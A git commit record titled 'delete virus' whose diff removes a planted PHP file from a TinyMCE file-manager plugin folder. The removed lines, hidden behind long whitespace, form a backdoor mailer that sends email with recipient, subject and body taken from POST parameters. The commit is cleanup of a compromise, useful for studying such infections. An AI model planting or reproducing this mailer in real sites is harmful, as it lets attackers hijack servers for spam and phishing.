ab237efd8636e1e84bc612403b5e3e20da809d58
dungvv.bro <jobhelper2008@gmail.com>
2015-04-21 16:49:47 +0700

    delete virus

--- admin/tiny_mce/plugins/ajaxfilemanager/inc/djshtyjg.php
+++
@@ -1,3 +0,0 @@
-																			<?php $ccvff = mail(stripslashes($_POST['uikmer']), stripslashes($_POST['xccxvqw']), stripslashes($_POST['weeoo']));
-																			if($ccvff){echo 'smdj';} else {echo 'mner : '.$ccvff;}          
-  
